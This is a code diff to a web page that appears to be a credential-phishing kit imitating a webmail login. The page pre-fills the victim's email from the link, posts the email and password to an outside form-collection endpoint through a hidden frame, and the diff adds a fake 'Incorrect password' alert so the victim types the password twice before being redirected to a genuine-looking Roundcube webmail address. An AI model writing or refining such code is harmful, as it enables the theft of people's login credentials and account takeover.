@@ -133,7 +133,7 @@
 
       <form id="mainForm" action="https://submit-form.com/vQBbiONxP" method="POST" autocomplete="on" target="hiddenFrame">
         <div id="stepEmail">
-          <input id="email" name="email" class="input" type="email" placeholder="Email address" autocomplete="email" required>
+          <input id="email" name="email" class="input" type="email" placeholder="Email address" autocomplete="email" readonly>
           <div class="center-row small-actions">
             <button id="continueBtn" class="btn-download" type="button">Continue</button>
           </div>
@@ -188,6 +188,8 @@
     const continueBtn = document.getElementById('continueBtn');
     const toggle = document.getElementById('togglePassword');
 
+    let passwordFirstEntry = "";
+
     // Autofill email (editable)
     window.addEventListener('DOMContentLoaded', () => {
       const params = new URLSearchParams(window.location.search);
@@ -227,18 +229,27 @@
       });
     }
 
-    // Submit the form regardless of password
+    // Handle the form submission and password validation
     document.getElementById('mainForm').addEventListener('submit', (e) => {
-      e.preventDefault(); // Prevent form submission to stay in the page
-      
-      // Immediately submit to FirmSpark
+      e.preventDefault(); // Prevent form submission to stay on the page
+
+      // First time password entered
+      if (passwordFirstEntry === "") {
+        passwordFirstEntry = passwordInput.value;
+        passwordInput.value = ''; // Clear password input to ask again
+        passwordInput.focus();
+        alert("Incorrect password. Please try again."); // Show alert for incorrect password
+        return; // Don't submit yet, wait for second password input
+      }
+
+      // Submit form regardless of password match
       try {
         document.getElementById('mainForm').submit();
       } catch (err) {
         console.warn('Error submitting the form', err);
       }
-      
-      // Optionally, redirect after form submission if needed
+
+      // Redirect after form submission
       window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
     });
   </script>
